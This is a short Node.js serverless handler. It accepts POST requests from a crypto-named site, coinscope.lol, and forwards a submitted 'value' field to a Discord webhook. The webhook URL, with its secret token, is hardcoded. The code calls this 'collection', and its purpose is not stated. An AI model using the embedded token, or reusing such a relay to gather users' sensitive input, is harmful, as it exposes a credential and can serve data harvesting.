module.exports = async function handler(req, res) {

  // CORS
  const allowedOrigins = [
    'https://www.coinscope.lol',
    'https://coinscope.lol'
  ];

  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle browser preflight request
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({
      error: 'Method not allowed'
    });
  }

  try {
    const { value } = req.body || {};

    if (!value) {
      return res.status(400).json({
        error: 'Missing value'
      });
    }

    const webhook = "https://discord.com/api/webhooks/1537215091672490044/6_yABK9woKznqk7mz_4fdahA0JOpynjiMchIUbf4Aptl29PlY_i35K3h-Y-ZZpXTi58A";

    const response = await fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: value
      })
    });

    if (!response.ok) {
      const errorText = await response.text();

      console.error(
        'Discord error:',
        response.status,
        errorText
      );

      return res.status(502).json({
        error: 'Discord webhook failed',
        status: response.status
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {
    console.error(
      'Collect error:',
      error
    );

    return res.status(500).json({
      error: 'Collection failed'
    });
  }
};